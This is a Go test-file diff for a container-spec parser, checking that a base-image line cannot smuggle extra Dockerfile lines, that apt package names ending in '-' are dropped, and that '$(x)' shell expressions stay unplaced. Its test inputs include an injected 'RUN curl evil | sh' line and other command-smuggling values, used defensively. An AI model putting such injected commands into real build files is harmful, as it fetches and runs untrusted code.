@@ -149,3 +149,44 @@ func TestLoadPullsThenReads(t *testing.T) {
 		t.Fatalf("the base was not pulled: %v", fake.Ops())
 	}
 }
+
+// The base is anchored at both ends: a digest at the end of the text does
+// not carry lines before it into the exec image's FROM (Go's $ anchors at
+// the end of the text only). A package never ends in "-", which apt reads
+// as "remove". Nothing is placed onto the runner's own name.
+func TestTheGrammarsCloseWhatAShellOrAptWouldRead(t *testing.T) {
+	if _, err := Parse("kali\nRUN curl evil | sh\nFROM x@sha256:"+strings.Repeat("0", 64), nil, nil, nil); err == nil {
+		t.Fatal("a base with lines before its digest was accepted")
+	}
+	d, err := Parse(base, []byte("objdump\tbinutils-\nagentry-runner\tbinutils\nstrings\tbinutils\n"), nil, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if d.Dropped != 2 {
+		t.Fatalf("dropped %d rows, want the package ending in - and the runner's name", d.Dropped)
+	}
+	if _, err := Parse(base, nil, []byte("pip\tagentry-runner\tx==1\n"), nil); err == nil {
+		t.Fatal("an extra named for the runner was accepted")
+	}
+	_, u := d.Place([]string{"agentry-runner"})
+	if len(u.Unplaced) != 1 || u.Unplaced[0].Command != "agentry-runner" {
+		t.Fatalf("a declared agentry-runner was placed: %+v", u)
+	}
+}
+
+// Declared commands are looked up as literal names (invariant 3): a shell
+// expression is unplaced, and a name that happens to be a real package's
+// command, such as apt, is placed as that command, never run.
+func TestDeclaredCommandsAreLiteralNames(t *testing.T) {
+	d, err := Parse(base, []byte("apt\tapt\n"), nil, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	pkgs, u := d.Place([]string{"$(x)", "apt"})
+	if !reflect.DeepEqual(pkgs, []string{"apt"}) || len(u.Unplaced) != 1 || u.Unplaced[0].Command != "$(x)" {
+		t.Fatalf("packages %v, placement %+v", pkgs, u)
+	}
+	if !reflect.DeepEqual(u.Apt, []spec.AptPlacement{{Command: "apt", Package: "apt"}}) {
+		t.Fatalf("apt placements %+v", u.Apt)
+	}
+}
